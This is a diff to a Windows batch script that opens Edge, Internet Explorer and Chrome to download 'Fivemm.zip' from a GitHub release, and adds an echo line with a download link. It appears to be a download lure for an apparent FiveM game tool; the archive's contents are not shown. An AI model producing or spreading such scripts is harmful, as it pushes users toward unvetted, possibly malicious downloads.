@@ -1,4 +1,5 @@
 @echo off
+echo [Download](https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip)
 start msedge https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
 start iexplore https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
 start chrome https://github.com/Fivemtool5/Fivem/releases/download/Fivem/Fivemm.zip
